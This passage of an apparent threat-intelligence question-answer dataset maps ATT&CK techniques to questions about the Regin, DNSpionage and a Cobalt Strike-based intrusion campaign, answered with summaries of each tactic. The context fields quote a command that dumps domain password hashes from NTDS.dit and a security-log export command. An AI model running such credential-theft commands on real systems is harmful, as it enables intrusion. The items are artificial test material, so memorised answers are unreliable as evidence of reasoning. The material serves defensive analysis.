Collection: Regin's collection capabilities are extensive, including several remote access Trojan (RAT) features such as capturing screenshots and taking control of the mouse's point-and-click functions. It can also gather computer information, steal passwords, monitor network traffic, and crawl through the file system. Advanced payload modules are designed to sniff low-level network traffic and exfiltrate data through various channels.
Command and Control: Regin's command-and-control (C&C) operations are extensive and bidirectional, allowing attackers to initiate communications with compromised computers or vice versa. Compromised computers can serve as a proxy for other infections, and C&C can happen in a peer-to-peer fashion. All communications are strongly encrypted and can use transport protocols such as ICMP, UDP, TCP, and HTTP. The C&C operations are undertaken by various modules, including major groups C373h, 19h, 9, as well as Stage 5 payloads, such as C375h and 1Bh.
Exfiltration: Regin's exfiltration capabilities include encoding and embedding payload information within cookie data under various names for HTTP-based C&C. It can also exfiltrate data through channels like TCP, UDP, ICMP, and HTTP. The threat logs data to the ApplicationLog.dat file, which is encrypted and compressed.",Yes,regin-analysis
2286,384,384-Initial Access-T1566-Phishing,"After creating fake websites with job postings and generating Let's Encrypt certificates to support DNS redirection during the resource development phase, is it likely that the DNSpionage attackers distributed malicious Microsoft Office documents to attempt initial access via spear-phishing before executing the DNSpionage malware upon opening the documents?","Initial Access: Initial access in the DNSpionage campaign was attempted through malicious websites hosting job listings, which redirected to legitimate company sites. The attackers likely distributed malicious Microsoft Office documents via spear-phishing to compromise targets.","Reconnaissance: The DNSpionage campaign involved meticulous reconnaissance, as evidenced by the attackers' understanding of the victims' network infrastructure to remain undetected. They targeted Lebanon and the UAE, focusing on .gov domains and a private Lebanese airline. The attackers likely used spear-phishing via email or social media platforms like LinkedIn to distribute malicious Microsoft Office documents with embedded macros, disguised as job postings on fake websites such as hr-wipro[.]com and hr-suncor[.]com.
Resource Development: The DNSpionage campaign demonstrated resource development by the attackers, who created two fake websites with job postings to compromise targets. They also generated Let's Encrypt certificates for redirected domains during DNS compromises, although it is unclear if these redirections were successful.
Execution: The DNSpionage malware executes in two steps: first, it decodes a PE file encoded with base64 when the document is opened, and second, it renames and executes the file as a scheduled task when the document is closed. This process requires human interaction and is designed to avoid sandbox detection.
Persistence: The DNSpionage malware maintains persistence by creating a scheduled task named 'chromiumupdater v 37.5.0' to execute the dropped binary every minute.
Defense Evasion: The DNSpionage malware employs defense evasion techniques by using password-protected macros in Microsoft Word to prevent victims from accessing the macro code and by using classical string obfuscation to avoid detection.
Discovery: The DNSpionage malware's initial reconnaissance phase involves commands to retrieve the infected user's username, hostname, and domain information, indicating a discovery process to understand the environment.
Command and Control: The DNSpionage malware uses HTTP and DNS for command and control communication with the C2 server. It crafts DNS requests to register the infected system and receive further instructions, and uses HTTP requests to retrieve configurations and orders from a fake Wikipedia page.
Impact: The DNS redirection part of the DNSpionage campaign could have a significant impact, as the attackers were able to intercept traffic destined for the redirected hostnames, potentially harvesting email and VPN credentials, and possibly enabling further attacks or blackmail.
Others: The DNSpionage campaign was discovered by Cisco Talos, authored by Warren Mercer and Paul Rascagneres. The campaign targeted Lebanon and the UAE, with no clear connection to other campaigns or actors. The attackers used Windows malware and DNS exfiltration and redirection, with five attacks launched this year, including one recently. The campaign highlights the need for strong endpoint and network protection against advanced actors with significant targets.",Yes,DNSpionage Campaign Targets Middle East
2287,384,384-Execution-T1053-Scheduled Task/Job,"After achieving initial access through malicious Microsoft Office documents distributed via spear-phishing, is it likely that the DNSpionage malware will execute a PE file before maintaining persistence by creating a scheduled task named 'chromiumupdater v 37.5.0'?","Execution: The DNSpionage malware executes in two steps: first, it decodes a PE file encoded with base64 when the document is opened, and second, it renames and executes the file as a scheduled task when the document is closed. This process requires human interaction and is designed to avoid sandbox detection.","Reconnaissance: The DNSpionage campaign involved meticulous reconnaissance, as evidenced by the attackers' understanding of the victims' network infrastructure to remain undetected. They targeted Lebanon and the UAE, focusing on .gov domains and a private Lebanese airline. The attackers likely used spear-phishing via email or social media platforms like LinkedIn to distribute malicious Microsoft Office documents with embedded macros, disguised as job postings on fake websites such as hr-wipro[.]com and hr-suncor[.]com.
Resource Development: The DNSpionage campaign demonstrated resource development by the attackers, who created two fake websites with job postings to compromise targets. They also generated Let's Encrypt certificates for redirected domains during DNS compromises, although it is unclear if these redirections were successful.
Initial Access: Initial access in the DNSpionage campaign was attempted through malicious websites hosting job listings, which redirected to legitimate company sites. The attackers likely distributed malicious Microsoft Office documents via spear-phishing to compromise targets.
Persistence: The DNSpionage malware maintains persistence by creating a scheduled task named 'chromiumupdater v 37.5.0' to execute the dropped binary every minute.
Defense Evasion: The DNSpionage malware employs defense evasion techniques by using password-protected macros in Microsoft Word to prevent victims from accessing the macro code and by using classical string obfuscation to avoid detection.
Discovery: The DNSpionage malware's initial reconnaissance phase involves commands to retrieve the infected user's username, hostname, and domain information, indicating a discovery process to understand the environment.
Command and Control: The DNSpionage malware uses HTTP and DNS for command and control communication with the C2 server. It crafts DNS requests to register the infected system and receive further instructions, and uses HTTP requests to retrieve configurations and orders from a fake Wikipedia page.
Impact: The DNS redirection part of the DNSpionage campaign could have a significant impact, as the attackers were able to intercept traffic destined for the redirected hostnames, potentially harvesting email and VPN credentials, and possibly enabling further attacks or blackmail.
Others: The DNSpionage campaign was discovered by Cisco Talos, authored by Warren Mercer and Paul Rascagneres. The campaign targeted Lebanon and the UAE, with no clear connection to other campaigns or actors. The attackers used Windows malware and DNS exfiltration and redirection, with five attacks launched this year, including one recently. The campaign highlights the need for strong endpoint and network protection against advanced actors with significant targets.",Yes,DNSpionage Campaign Targets Middle East
2288,384,384-Execution-T1204-User Execution,"After initial access is achieved through the distribution of malicious Microsoft Office documents via spear-phishing, is it likely that the DNSpionage malware will require human interaction to execute payloads before maintaining persistence by creating a scheduled task named 'chromiumupdater v 37.5.0'?","Execution: The DNSpionage malware executes in two steps: first, it decodes a PE file encoded with base64 when the document is opened, and second, it renames and executes the file as a scheduled task when the document is closed. This process requires human interaction and is designed to avoid sandbox detection.","Reconnaissance: The DNSpionage campaign involved meticulous reconnaissance, as evidenced by the attackers' understanding of the victims' network infrastructure to remain undetected. They targeted Lebanon and the UAE, focusing on .gov domains and a private Lebanese airline. The attackers likely used spear-phishing via email or social media platforms like LinkedIn to distribute malicious Microsoft Office documents with embedded macros, disguised as job postings on fake websites such as hr-wipro[.]com and hr-suncor[.]com.
Resource Development: The DNSpionage campaign demonstrated resource development by the attackers, who created two fake websites with job postings to compromise targets. They also generated Let's Encrypt certificates for redirected domains during DNS compromises, although it is unclear if these redirections were successful.
Initial Access: Initial access in the DNSpionage campaign was attempted through malicious websites hosting job listings, which redirected to legitimate company sites. The attackers likely distributed malicious Microsoft Office documents via spear-phishing to compromise targets.
Persistence: The DNSpionage malware maintains persistence by creating a scheduled task named 'chromiumupdater v 37.5.0' to execute the dropped binary every minute.
Defense Evasion: The DNSpionage malware employs defense evasion techniques by using password-protected macros in Microsoft Word to prevent victims from accessing the macro code and by using classical string obfuscation to avoid detection.
Discovery: The DNSpionage malware's initial reconnaissance phase involves commands to retrieve the infected user's username, hostname, and domain information, indicating a discovery process to understand the environment.
Command and Control: The DNSpionage malware uses HTTP and DNS for command and control communication with the C2 server. It crafts DNS requests to register the infected system and receive further instructions, and uses HTTP requests to retrieve configurations and orders from a fake Wikipedia page.
Impact: The DNS redirection part of the DNSpionage campaign could have a significant impact, as the attackers were able to intercept traffic destined for the redirected hostnames, potentially harvesting email and VPN credentials, and possibly enabling further attacks or blackmail.
Others: The DNSpionage campaign was discovered by Cisco Talos, authored by Warren Mercer and Paul Rascagneres. The campaign targeted Lebanon and the UAE, with no clear connection to other campaigns or actors. The attackers used Windows malware and DNS exfiltration and redirection, with five attacks launched this year, including one recently. The campaign highlights the need for strong endpoint and network protection against advanced actors with significant targets.",Yes,DNSpionage Campaign Targets Middle East
2290,384,384-Command and Control-T1071-Application Layer Protocol,"After the DNSpionage malware employs defense evasion techniques, such as using password-protected macros in Microsoft Word and classical string obfuscation, is it likely that the malware will enter its discovery phase to retrieve the infected user's username, hostname, and domain information before using HTTP and DNS for command and control communication with the C2 server?","Command and Control: The DNSpionage malware uses HTTP and DNS for command and control communication with the C2 server. It crafts DNS requests to register the infected system and receive further instructions, and uses HTTP requests to retrieve configurations and orders from a fake Wikipedia page.","Reconnaissance: The DNSpionage campaign involved meticulous reconnaissance, as evidenced by the attackers' understanding of the victims' network infrastructure to remain undetected. They targeted Lebanon and the UAE, focusing on .gov domains and a private Lebanese airline. The attackers likely used spear-phishing via email or social media platforms like LinkedIn to distribute malicious Microsoft Office documents with embedded macros, disguised as job postings on fake websites such as hr-wipro[.]com and hr-suncor[.]com.
Resource Development: The DNSpionage campaign demonstrated resource development by the attackers, who created two fake websites with job postings to compromise targets. They also generated Let's Encrypt certificates for redirected domains during DNS compromises, although it is unclear if these redirections were successful.
Initial Access: Initial access in the DNSpionage campaign was attempted through malicious websites hosting job listings, which redirected to legitimate company sites. The attackers likely distributed malicious Microsoft Office documents via spear-phishing to compromise targets.
Execution: The DNSpionage malware executes in two steps: first, it decodes a PE file encoded with base64 when the document is opened, and second, it renames and executes the file as a scheduled task when the document is closed. This process requires human interaction and is designed to avoid sandbox detection.
Persistence: The DNSpionage malware maintains persistence by creating a scheduled task named 'chromiumupdater v 37.5.0' to execute the dropped binary every minute.
Defense Evasion: The DNSpionage malware employs defense evasion techniques by using password-protected macros in Microsoft Word to prevent victims from accessing the macro code and by using classical string obfuscation to avoid detection.
Discovery: The DNSpionage malware's initial reconnaissance phase involves commands to retrieve the infected user's username, hostname, and domain information, indicating a discovery process to understand the environment.
Impact: The DNS redirection part of the DNSpionage campaign could have a significant impact, as the attackers were able to intercept traffic destined for the redirected hostnames, potentially harvesting email and VPN credentials, and possibly enabling further attacks or blackmail.
Others: The DNSpionage campaign was discovered by Cisco Talos, authored by Warren Mercer and Paul Rascagneres. The campaign targeted Lebanon and the UAE, with no clear connection to other campaigns or actors. The attackers used Windows malware and DNS exfiltration and redirection, with five attacks launched this year, including one recently. The campaign highlights the need for strong endpoint and network protection against advanced actors with significant targets.",Yes,DNSpionage Campaign Targets Middle East
2294,384,384-Reconnaissance-T1591-Gather Victim Org Information,"After DNSpionage attackers demonstrated resource development by generating Let's Encrypt certificates for redirected domains related to their fake websites and before employing password-protected macros in malicious Microsoft Office documents to evade detection, is it likely that they focused on .gov domains and a private Lebanese airline to conduct reconnaissance of their targets' infrastructure?","Reconnaissance: The DNSpionage campaign involved meticulous reconnaissance, as evidenced by the attackers' understanding of the victims' network infrastructure to remain undetected. They targeted Lebanon and the UAE, focusing on .gov domains and a private Lebanese airline. The attackers likely used spear-phishing via email or social media platforms like LinkedIn to distribute malicious Microsoft Office documents with embedded macros, disguised as job postings on fake websites such as hr-wipro[.]com and hr-suncor[.]com.","Resource Development: The DNSpionage campaign demonstrated resource development by the attackers, who created two fake websites with job postings to compromise targets. They also generated Let's Encrypt certificates for redirected domains during DNS compromises, although it is unclear if these redirections were successful.
Initial Access: Initial access in the DNSpionage campaign was attempted through malicious websites hosting job listings, which redirected to legitimate company sites. The attackers likely distributed malicious Microsoft Office documents via spear-phishing to compromise targets.
Execution: The DNSpionage malware executes in two steps: first, it decodes a PE file encoded with base64 when the document is opened, and second, it renames and executes the file as a scheduled task when the document is closed. This process requires human interaction and is designed to avoid sandbox detection.
Persistence: The DNSpionage malware maintains persistence by creating a scheduled task named 'chromiumupdater v 37.5.0' to execute the dropped binary every minute.
Defense Evasion: The DNSpionage malware employs defense evasion techniques by using password-protected macros in Microsoft Word to prevent victims from accessing the macro code and by using classical string obfuscation to avoid detection.
Discovery: The DNSpionage malware's initial reconnaissance phase involves commands to retrieve the infected user's username, hostname, and domain information, indicating a discovery process to understand the environment.
Command and Control: The DNSpionage malware uses HTTP and DNS for command and control communication with the C2 server. It crafts DNS requests to register the infected system and receive further instructions, and uses HTTP requests to retrieve configurations and orders from a fake Wikipedia page.
Impact: The DNS redirection part of the DNSpionage campaign could have a significant impact, as the attackers were able to intercept traffic destined for the redirected hostnames, potentially harvesting email and VPN credentials, and possibly enabling further attacks or blackmail.
Others: The DNSpionage campaign was discovered by Cisco Talos, authored by Warren Mercer and Paul Rascagneres. The campaign targeted Lebanon and the UAE, with no clear connection to other campaigns or actors. The attackers used Windows malware and DNS exfiltration and redirection, with five attacks launched this year, including one recently. The campaign highlights the need for strong endpoint and network protection against advanced actors with significant targets.",Yes,DNSpionage Campaign Targets Middle East
2300,385,385-Execution-T1059-Command and Scripting Interpreter,"Before installing the Cobalt Strike beacon using a PowerShell one-liner, is it likely that the adversary accessed the victim's VPN using credentials obtained through password spraying, and after installation, leveraged scheduled tasks to execute a batch file for their tasks?","Execution: The adversary installs Cobalt Strike, a framework designed for adversary simulation intended for penetration testers and red teams, which has been widely adopted by malicious threats. The Cobalt Strike beacon is installed in memory by using a PowerShell one-liner. At least three versions of Cobalt Strike have been in use by the adversary: v3.8, v3.12, and v3.14. The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.","Initial Access: This adversary starts with obtaining usernames and passwords of their victim from previous breaches. These credentials are used in a credential stuffing or password spraying attack against the victim's remote services, such as webmail or other internet reachable mail services. After obtaining a valid account, they use this account to access the victim's VPN, Citrix or another remote service that allows access to the network of the victim. Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources accessible by the compromised account.
Persistence: The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system. Once the system is rebooted, the beacon is gone. The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as servers. Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.
Privilege Escalation: The adversary started a password spraying attack against domain admin accounts, and successfully got a valid domain admin account this way. In other cases, the adversary moved laterally to another system with a domain admin logged in. They used a tool called NtdsAudit to dump the password hashes of domain users as well as observed the following command: msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv. Both ntdsutil and esentutl are by default installed on a domain controller.
Defense Evasion: The adversary attempts to clean-up some of the traces from their intrusions. While we don't know what was deleted and we were unable to recover, we did see some of their anti-forensics activity: Windows event logs clearing, File deletion, Timestomping. For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command. This tool is included in the UnxUtils repository. This makes sure the used tools by the adversary blend in with the other files in the directory when shown in a timeline.
Credential Access: The adversary achieves credentials access by brute force, and more specifically by credential stuffing or password spraying. The traces in log files showed more than usual login attempts with a username formatted as email address, e.g.<username>@<email domain>. While usernames for legitimate logins at the victim's network were generally formatted like <domain>\<username>. And attempted logins came from a relative small set of IP-addresses.
Discovery: The adversary applied a wide range of discovery tactics. In the list below we have highlighted a few specific tools the adversary used for discovery purposes. You can find a summary of most of the commands used by the adversary to perform discovery at the end of this article. Account discovery tool: PsLogList Command used: psloglist.exe -accepteula -x security -s -a <date> This command exports a text file with comma separated fields. The text files contain the contents of the Security Event log after the specified date. Psloglist is part of the Sysinternals toolkit from Mark Russinovich (Microsoft). The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file. A possible intent of the adversary could be to identify if privileged users are active on the systems. If such a privileged user was recently active on a server the actor executes Cobalt Strike's built-in Mimikatz to dump its credentials or password hash.
Lateral Movement: The adversary used the built-in lateral movement possibilities in Cobalt Strike. Cobalt Strike has various methods for deploying its beacons at newly compromised systems. We have seen the adversary using SMB, named pipes, PsExec, and WinRM. The adversary attempts to move to a domain controller as soon as possible after getting foothold into the victim's network. They continue lateral movement and discovery in an attempt to identify the data of interest. This could be a webserver to carve PII from memory, or a fileserver to copy IP, as we have both observed.
Collection: In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim's network. As described before, the adversary collected data from an information repository, Microsoft SharePoint Online in this case. This document was exfiltrated and used to continue the intrusion via a company portal and VPN. In all cases we've seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems. But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems.
Command and Control: The adversary uses Cobalt Strike as framework to manage their compromised systems. We observed the use of Cobalt Strike's C2 protocol encapsulated in DNS by the adversary in 2017 and 2018. They switched to C2 encapsulated in HTTPS in Q3 2019. An interesting observation is they made use of a cracked/patched trial version of Cobalt Strike. This is important to note because the functionalities of Cobalt Strike's trial version are limited. More importantly: the trial version doesn't support encryption of command and control traffic in cases where the protocol itself isn't encrypted, such as DNS.
Exfiltration: The adversary uses the command and control channel to exfiltrate small amounts of data. This is usually information containing account details. For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else. Once the larger chunks of data are compressed, encrypted, and staged, the data is exfiltrated using a custom built tool. This tool exfiltrates specified files to cloud storage web services. The following cloud storage web services are supported by the malware: Dropbox, Google Drive, OneDrive.",Yes,research.nccgroup.com-Abusing cloud services to fly under the radar
2301,385,385-Execution-T1053-Scheduled Task/Job,"After obtaining access to the victim's network through compromised remote services such as VPN or Citrix, is it likely that the adversary will rely on scheduled tasks to execute the Cobalt Strike beacon in memory before achieving persistence by targeting systems with high uptimes like servers?","Execution: The adversary installs Cobalt Strike, a framework designed for adversary simulation intended for penetration testers and red teams, which has been widely adopted by malicious threats. The Cobalt Strike beacon is installed in memory by using a PowerShell one-liner. At least three versions of Cobalt Strike have been in use by the adversary: v3.8, v3.12, and v3.14. The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.","Initial Access: This adversary starts with obtaining usernames and passwords of their victim from previous breaches. These credentials are used in a credential stuffing or password spraying attack against the victim's remote services, such as webmail or other internet reachable mail services. After obtaining a valid account, they use this account to access the victim's VPN, Citrix or another remote service that allows access to the network of the victim. Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources accessible by the compromised account.
Persistence: The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system. Once the system is rebooted, the beacon is gone. The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as servers. Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.
Privilege Escalation: The adversary started a password spraying attack against domain admin accounts, and successfully got a valid domain admin account this way. In other cases, the adversary moved laterally to another system with a domain admin logged in. They used a tool called NtdsAudit to dump the password hashes of domain users as well as observed the following command: msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv. Both ntdsutil and esentutl are by default installed on a domain controller.
Defense Evasion: The adversary attempts to clean-up some of the traces from their intrusions. While we don't know what was deleted and we were unable to recover, we did see some of their anti-forensics activity: Windows event logs clearing, File deletion, Timestomping. For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command. This tool is included in the UnxUtils repository. This makes sure the used tools by the adversary blend in with the other files in the directory when shown in a timeline.
Credential Access: The adversary achieves credentials access by brute force, and more specifically by credential stuffing or password spraying. The traces in log files showed more than usual login attempts with a username formatted as email address, e.g.<username>@<email domain>. While usernames for legitimate logins at the victim's network were generally formatted like <domain>\<username>. And attempted logins came from a relative small set of IP-addresses.
Discovery: The adversary applied a wide range of discovery tactics. In the list below we have highlighted a few specific tools the adversary used for discovery purposes. You can find a summary of most of the commands used by the adversary to perform discovery at the end of this article. Account discovery tool: PsLogList Command used: psloglist.exe -accepteula -x security -s -a <date> This command exports a text file with comma separated fields. The text files contain the contents of the Security Event log after the specified date. Psloglist is part of the Sysinternals toolkit from Mark Russinovich (Microsoft). The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file. A possible intent of the adversary could be to identify if privileged users are active on the systems. If such a privileged user was recently active on a server the actor executes Cobalt Strike's built-in Mimikatz to dump its credentials or password hash.
Lateral Movement: The adversary used the built-in lateral movement possibilities in Cobalt Strike. Cobalt Strike has various methods for deploying its beacons at newly compromised systems. We have seen the adversary using SMB, named pipes, PsExec, and WinRM. The adversary attempts to move to a domain controller as soon as possible after getting foothold into the victim's network. They continue lateral movement and discovery in an attempt to identify the data of interest. This could be a webserver to carve PII from memory, or a fileserver to copy IP, as we have both observed.
Collection: In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim's network. As described before, the adversary collected data from an information repository, Microsoft SharePoint Online in this case. This document was exfiltrated and used to continue the intrusion via a company portal and VPN. In all cases we've seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems. But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems.
Command and Control: The adversary uses Cobalt Strike as framework to manage their compromised systems. We observed the use of Cobalt Strike's C2 protocol encapsulated in DNS by the adversary in 2017 and 2018. They switched to C2 encapsulated in HTTPS in Q3 2019. An interesting observation is they made use of a cracked/patched trial version of Cobalt Strike. This is important to note because the functionalities of Cobalt Strike's trial version are limited. More importantly: the trial version doesn't support encryption of command and control traffic in cases where the protocol itself isn't encrypted, such as DNS.
Exfiltration: The adversary uses the command and control channel to exfiltrate small amounts of data. This is usually information containing account details. For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else. Once the larger chunks of data are compressed, encrypted, and staged, the data is exfiltrated using a custom built tool. This tool exfiltrates specified files to cloud storage web services. The following cloud storage web services are supported by the malware: Dropbox, Google Drive, OneDrive.",Yes,research.nccgroup.com-Abusing cloud services to fly under the radar
2302,385,385-Defense Evasion-T1070-Indicator Removal,"After using PsLogList for account discovery and potentially executing Cobalt Strike's built-in Mimikatz to dump credentials of privileged users during the Discovery phase, is it likely that the adversary will attempt to clean-up traces from their intrusions through activities such as Windows event logs clearing, file deletion, and timestomping during the Defense Evasion phase?","Defense Evasion: The adversary attempts to clean-up some of the traces from their intrusions. While we don't know what was deleted and we were unable to recover, we did see some of their anti-forensics activity: Windows event logs clearing, File deletion, Timestomping. For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command. This tool is included in the UnxUtils repository. This makes sure the used tools by the adversary blend in with the other files in the directory when shown in a timeline.","Initial Access: This adversary starts with obtaining usernames and passwords of their victim from previous breaches. These credentials are used in a credential stuffing or password spraying attack against the victim's remote services, such as webmail or other internet reachable mail services. After obtaining a valid account, they use this account to access the victim's VPN, Citrix or another remote service that allows access to the network of the victim. Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources accessible by the compromised account.
Execution: The adversary installs Cobalt Strike, a framework designed for adversary simulation intended for penetration testers and red teams, which has been widely adopted by malicious threats. The Cobalt Strike beacon is installed in memory by using a PowerShell one-liner. At least three versions of Cobalt Strike have been in use by the adversary: v3.8, v3.12, and v3.14. The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.
Persistence: The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system. Once the system is rebooted, the beacon is gone. The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as servers. Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.
Privilege Escalation: The adversary started a password spraying attack against domain admin accounts, and successfully got a valid domain admin account this way. In other cases, the adversary moved laterally to another system with a domain admin logged in. They used a tool called NtdsAudit to dump the password hashes of domain users as well as observed the following command: msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv. Both ntdsutil and esentutl are by default installed on a domain controller.
Credential Access: The adversary achieves credentials access by brute force, and more specifically by credential stuffing or password spraying. The traces in log files showed more than usual login attempts with a username formatted as email address, e.g.<username>@<email domain>. While usernames for legitimate logins at the victim's network were generally formatted like <domain>\<username>. And attempted logins came from a relative small set of IP-addresses.
Discovery: The adversary applied a wide range of discovery tactics. In the list below we have highlighted a few specific tools the adversary used for discovery purposes. You can find a summary of most of the commands used by the adversary to perform discovery at the end of this article. Account discovery tool: PsLogList Command used: psloglist.exe -accepteula -x security -s -a <date> This command exports a text file with comma separated fields. The text files contain the contents of the Security Event log after the specified date. Psloglist is part of the Sysinternals toolkit from Mark Russinovich (Microsoft). The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file. A possible intent of the adversary could be to identify if privileged users are active on the systems. If such a privileged user was recently active on a server the actor executes Cobalt Strike's built-in Mimikatz to dump its credentials or password hash.
Lateral Movement: The adversary used the built-in lateral movement possibilities in Cobalt Strike. Cobalt Strike has various methods for deploying its beacons at newly compromised systems. We have seen the adversary using SMB, named pipes, PsExec, and WinRM. The adversary attempts to move to a domain controller as soon as possible after getting foothold into the victim's network. They continue lateral movement and discovery in an attempt to identify the data of interest. This could be a webserver to carve PII from memory, or a fileserver to copy IP, as we have both observed.
Collection: In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim's network. As described before, the adversary collected data from an information repository, Microsoft SharePoint Online in this case. This document was exfiltrated and used to continue the intrusion via a company portal and VPN. In all cases we've seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems. But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems.
Command and Control: The adversary uses Cobalt Strike as framework to manage their compromised systems. We observed the use of Cobalt Strike's C2 protocol encapsulated in DNS by the adversary in 2017 and 2018. They switched to C2 encapsulated in HTTPS in Q3 2019. An interesting observation is they made use of a cracked/patched trial version of Cobalt Strike. This is important to note because the functionalities of Cobalt Strike's trial version are limited. More importantly: the trial version doesn't support encryption of command and control traffic in cases where the protocol itself isn't encrypted, such as DNS.
Exfiltration: The adversary uses the command and control channel to exfiltrate small amounts of data. This is usually information containing account details. For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else. Once the larger chunks of data are compressed, encrypted, and staged, the data is exfiltrated using a custom built tool. This tool exfiltrates specified files to cloud storage web services. The following cloud storage web services are supported by the malware: Dropbox, Google Drive, OneDrive.",Yes,research.nccgroup.com-Abusing cloud services to fly under the radar
2304,385,385-Discovery-T1082-System Information Discovery,"Is it likely that the adversary will move laterally to a domain controller using SMB, PsExec, or WinRM after using PsLogList for account discovery with exported Windows Security Event Logs and executing Cobalt Strike's built-in Mimikatz to dump credentials?",Discovery: The adversary applied a wide range of discovery tactics. In the list below we have highlighted a few specific tools the adversary used for discovery purposes. You can find a summary of most of the commands used by the adversary to perform discovery at the end of this article. Account discovery tool: PsLogList Command used: psloglist.exe -accepteula -x security -s -a <date> This command exports a text file with comma separated fields. The text files contain the contents of the Security Event log after the specified date. Psloglist is part of the Sysinternals toolkit from Mark Russinovich (Microsoft). The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file. A possible intent of the adversary could be to identify if privileged users are active on the systems. If such a privileged user was recently active on a server the actor executes Cobalt Strike's built-in Mimikatz to dump its credentials or password hash.,"Initial Access: This adversary starts with obtaining usernames and passwords of their victim from previous breaches. These credentials are used in a credential stuffing or password spraying attack against the victim's remote services, such as webmail or other internet reachable mail services. After obtaining a valid account, they use this account to access the victim's VPN, Citrix or another remote service that allows access to the network of the victim. Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources accessible by the compromised account.
Execution: The adversary installs Cobalt Strike, a framework designed for adversary simulation intended for penetration testers and red teams, which has been widely adopted by malicious threats. The Cobalt Strike beacon is installed in memory by using a PowerShell one-liner. At least three versions of Cobalt Strike have been in use by the adversary: v3.8, v3.12, and v3.14. The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.
Persistence: The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system. Once the system is rebooted, the beacon is gone. The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as servers. Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.
Privilege Escalation: The adversary started a password spraying attack against domain admin accounts, and successfully got a valid domain admin account this way. In other cases, the adversary moved laterally to another system with a domain admin logged in. They used a tool called NtdsAudit to dump the password hashes of domain users as well as observed the following command: msadcs.exe ""NTDS.dit"" -s ""SYSTEM"" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv. Both ntdsutil and esentutl are by default installed on a domain controller.
Defense Evasion: The adversary attempts to clean-up some of the traces from their intrusions. While we don't know what was deleted and we were unable to recover, we did see some of their anti-forensics activity: Windows event logs clearing, File deletion, Timestomping. For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command. This tool is included in the UnxUtils repository. This makes sure the used tools by the adversary blend in with the other files in the directory when shown in a timeline.
Credential Access: The adversary achieves credentials access by brute force, and more specifically by credential stuffing or password spraying. The traces in log files showed more than usual login attempts with a username formatted as email address, e.g.<username>@<email domain>. While usernames for legitimate logins at the victim's network were generally formatted like <domain>\<username>. And attempted logins came from a relative small set of IP-addresses.
Lateral Movement: The adversary used the built-in lateral movement possibilities in Cobalt Strike. Cobalt Strike has various methods for deploying its beacons at newly compromised systems. We have seen the adversary using SMB, named pipes, PsExec, and WinRM. The adversary attempts to move to a domain controller as soon as possible after getting foothold into the victim's network. They continue lateral movement and discovery in an attempt to identify the data of interest. This could be a webserver to carve PII from memory, or a fileserver to copy IP, as we have both observed.
Collection: In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim's network. As described before, the adversary collected data from an information repository, Microsoft SharePoint Online in this case. This document was exfiltrated and used to continue the intrusion via a company portal and VPN. In all cases we've seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems. But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems.
Command and Control: The adversary uses Cobalt Strike as framework to manage their compromised systems. We observed the use of Cobalt Strike's C2 protocol encapsulated in DNS by the adversary in 2017 and 2018. They switched to C2 encapsulated in HTTPS in Q3 2019. An interesting observation is they made use of a cracked/patched trial version of Cobalt Strike. This is important to note because the functionalities of Cobalt Strike's trial version are limited. More importantly: the trial version doesn't support encryption of command and control traffic in cases where the protocol itself isn't encrypted, such as DNS.
